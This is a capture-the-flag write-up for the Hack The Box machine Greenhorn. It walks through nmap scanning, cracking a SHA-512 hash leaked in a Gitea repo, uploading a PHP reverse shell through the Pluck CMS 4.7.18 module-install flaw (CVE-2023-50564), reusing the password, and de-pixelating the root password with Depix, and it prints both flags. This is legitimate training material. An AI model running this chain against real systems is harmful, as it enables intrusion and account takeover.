sudo Hello! Today we will be pwning another HTB machine called [Greenhorn](https://app.hackthebox.com/machines/greenhorn)

### Tools 
The following tools will be used
1. Nmap
2. hash id
3. johntheripper/hashcat(whichever you prefer)
4. pdfimages
5. depix


![[Pasted image 20240904104835.png]]


start with initial  ping scan whether machine is active or not then follow up with an Nmap scan

```bash
nmap-sV -sC -Pn 10.10.11.25
```

Here are the results of the nmap scan.

```
```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/greenhorn]
└─$ nmap -sV -sC -Pn 10.10.11.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 09:44 IST
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.33s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp    open     http      nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-title: Welcome to GreenHorn ! - GreenHorn
|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: pluck 4.7.18
|_http-trane-info: Problem with XML parsing of /evox/about
648/tcp   filtered rrp
722/tcp   filtered unknown
1234/tcp  filtered hotline
3000/tcp  open     ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=0582fe7e2ae8e0f7; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=79Ds-pfA5vRiTdXDlsZ1TafTwcQ6MTcyNzY2OTcyNDY4MTU4ODg5Mw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 30 Sep 2024 04:15:24 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=24ad499d7275b9ea; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=lou1tTuLNv-L_sak-cblEdsO_IQ6MTcyNzY2OTczMTk4Nzc1NTA3MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 30 Sep 2024 04:15:31 GMT
|_    Content-Length: 0
6901/tcp  filtered jetstream
9003/tcp  filtered unknown
10629/tcp filtered unknown
27000/tcp filtered flexlm0
34573/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.84 seconds

```

We can see that there are three ports open. 22 is for SSH, 80 is for a web server, and 3000 is for another web server.

Let's check the website first. When accessing  the web with IP it is being redirected to `greenhorn.htb`. So In order to access it, you need to add the `Ipaddr` and `domain name` into you local dns file(`/etc/hosts`).

The script to add the `domain` into dns file.


```bash
ip="10.10.11.25"
domain="greenhorn.htb"
grep -qF "$ip $domain" /etc/hosts || echo -e "$ip $domain" | sudo tee -a /etc/hosts
```

![[Pasted image 20240904112138.png]]

After doing the above, you can access the website and you will be greeted with `welcome to greenhorn` in the  portal powered by `PLUCK CMS`.


![[Pasted image 20240904112331.png]]

Going through Web Pages , there is nothing much relevant, Let's check the web service running on port 3000

![[Pasted image 20240904133453.png]]

At this port, we have another home page. There are also a lot of choices on this page, like "Explore" and "Help." We clicked "Explore" instead of "Help" because it wasn't useful to us.  
The hosted source for the Greenhorn website can be found on the Explore page.

![[Pasted image 20240904133539.png]]



As we go through the different files, we learn that the login.php file asks the server for the pass.php file to check the password. You can find this file in the `data/settings` folder.

![[Pasted image 20240904134053.png]]


Now lets check that `pass.php` which is located in `data/settings`.In there we can find a hash encoded value.

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

Decoding the following hash we can get the password to log into the `cms` portal.

![[Pasted image 20240904140023.png]]

So, I utilized `hashid` to identify the hash

```bash
hashid -m -j
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163
```

- -m : This flag specifies the hash format for hashcat tool.
- -j: This flag specifies the hash format for john the ripper tool

Once you identified the hash use your preferred hash cracking tool to get the decoded value.

```bash
john --format=raw-sha512 hash.txt
```

![[Pasted image 20240904140335.png]]

Now you can log in to the admin portal using the decoded value `iloveyou1` at `greenhorn.htb/login.php`

![[Pasted image 20240904140759.png]]

We may modify pages or add new pages here, and we can also see the current version of pluck cms, which is `4.7.18`.

This particular version of pluck cms is associated Remote Code Execution(RCE) exploit.
You can find more details about it from this github [link](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC). 

So I cloned the github repository and I's using reverse shell script of [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) followed the steps as directed in the `README` and altered the parameters with my `IPaddr` and `port`

![[Pasted image 20241013184648.png]]

Now zip this php file as `shell.zip` and start a rev shell listener in another terminal with the port number same as given in php file.

Now specify the `web login url` , `upload_url` and the `file_path` in the `poc.py` code

![[Pasted image 20241013185442.png]]

So when executing the code if you happen to run into any errors like cant find modules. you can directly head to the url specified in poc.py which is `http://greenhorn.htb/admin.php?action=installmodule` and upload `shell.zip` yourselves

![[Pasted image 20241013190454.png]]

After a moment of seconds, you will get a reverse shell

![[Pasted image 20241013190643.png]]

After making the shell stabilized, I searched the known directories in the machine and found `user.txt` in `junior` folder but I can't seem to access it due to permissions.

```bash
www-data@greenhorn:/$ whoami
www-data
www-data@greenhorn:/$ ls
bin   cdrom  dev  home	lib32  libx32	   media  opt	root  sbin  sys  usr
boot  data   etc  lib	lib64  lost+found  mnt	  proc	run   srv   tmp  var
www-data@greenhorn:/$ cd home/
www-data@greenhorn:/home$ ls
git  junior
www-data@greenhorn:/home$ cd junior
www-data@greenhorn:/home/junior$ ls
'Using OpenVAS.pdf'   user.txt
www-data@greenhorn:/home/junior$ cat user.txt 
cat: user.txt: Permission denied
```

So, Let's switch to user `junior` and trying the previous used password `iloveyou1` we got access.

![[Pasted image 20241013191450.png]]


## Privilege Escalation

Now onto the vertical escalation part

In `junior` folder we have an interesting pdf file. Let's download it to our machine using python

```bash
python3 -m http.server
```

Once the server is up and running in reverse shell. Download that pdf file to your local machine by using wget command.

```bash
sudo wget http://10.10.11.25:8000/Using%20OpenVAS.pdf
```

Once done you will successfully download that pdf file to your machine.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/greenhorn/CVE-2023-50564_Pluck-
└─$ sudo wget http://10.10.11.25:8000/Using%20OpenVAS.pdf
[sudo] password for dkvv: 
--2024-10-13 19:25:26--  http://10.10.11.25:8000/Using%20OpenVAS.pdf
Connecting to 10.10.11.25:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 61367 (60K) [application/pdf]
Saving to: ‘Using OpenVAS.pdf’

Using OpenVAS.pdf             100%[=================================================>]  59.93K   122KB/s    in 0.5s    

2024-10-13 19:25:27 (122 KB/s) - ‘Using OpenVAS.pdf’ saved [61367/61367]
```


Lets check out that pdf file now.

![[Pasted image 20241013193226.png]]

It's message to junior from root user `Mr.green` and it contains some password but is pixelated.

I'm gonna use `Depix` which helps in recovering plaintext from blurry screenshots.

But first lets convert the pdf to image format

```bash
sudo pdfimages -png Using\ OpenVAS.pdf img
```

It will convert the pdf file to png format. run depix to get the password. 

```bash
python3 depix.py -p img-000.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```

Once done it will be saved to output.png.

```bash
┌──(dkvv㉿kali)-[/home/…/machines/greenhorn/CVE-2023-50564_Pluck-v4.7.18_PoC/Depix]
└─# python3 depix.py -p img-000.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-10-13 20:23:39,401 - Loading pixelated image from img-000.png
2024-10-13 20:23:39,473 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-10-13 20:23:43,595 - Finding color rectangles from pixelated space
2024-10-13 20:23:43,599 - Found 252 same color rectangles
2024-10-13 20:23:43,600 - 190 rectangles left after moot filter
2024-10-13 20:23:43,600 - Found 1 different rectangle sizes
2024-10-13 20:23:43,600 - Finding matches in search image
2024-10-13 20:23:43,601 - Scanning 190 blocks with size (5, 5)
2024-10-13 20:23:43,694 - Scanning in searchImage: 0/1674
2024-10-13 20:26:02,114 - Removing blocks with no matches
2024-10-13 20:26:02,114 - Splitting single matches and multiple matches
2024-10-13 20:26:02,124 - [16 straight matches | 174 multiple matches]
2024-10-13 20:26:02,124 - Trying geometrical matches on single-match squares
2024-10-13 20:26:03,024 - [29 straight matches | 161 multiple matches]
2024-10-13 20:26:03,025 - Trying another pass on geometrical matches
2024-10-13 20:26:03,855 - [41 straight matches | 149 multiple matches]
2024-10-13 20:26:03,855 - Writing single match results to output
2024-10-13 20:26:03,857 - Writing average results for multiple matches to output
2024-10-13 20:26:10,319 - Saving output image to: output.png

```

![[Pasted image 20241013203029.png]]

We got the password saying

```text
sidefromsidetheothersidesidefromsidetheotherside
```

Since we know this is password for root user. Let's try it out.

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/greenhorn/CVE-2023-50564_Pluck-v4.7.18_PoC/Depix]
└─$ ssh root@10.10.11.25
The authenticity of host '10.10.11.25 (10.10.11.25)' can't be established.
ED25519 key fingerprint is SHA256:FrgpM50adTncJAsWACDugfF7duPzn9d6RzjZZFHNtLo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.25' (ED25519) to the list of known hosts.
root@10.10.11.25's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Oct 13 03:02:43 PM UTC 2024

  System load:           0.0
  Usage of /:            57.6% of 3.45GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.25
  IPv6 address for eth0: dead:beef::250:56ff:feb0:71d8


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento
Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~# 

```

and we are in as root user lets go get the root flag

![[Pasted image 20241013203407.png]]

![[Pasted image 20241013203526.png]]



<details>
  <summary>Click to reveal</summary>
  User: e0df4cec33dc24fed0b16c4bb56b4d65
  Root: b9ee67db79356da273e1047809c29ca7
</details>


## References:
1. [Pluck CMS 4.7.18 exploit](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC): CVE-2023-50564 is a vulnerability that allows unauthorized file uploads in Pluck CMS version 4.7.18.
2.  [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) : The reverse shell php code of pentest moneky
3. [Depix](https://github.com/spipm/Depix) : Depix is a PoC for a technique to recover plaintext from pixelized screenshots.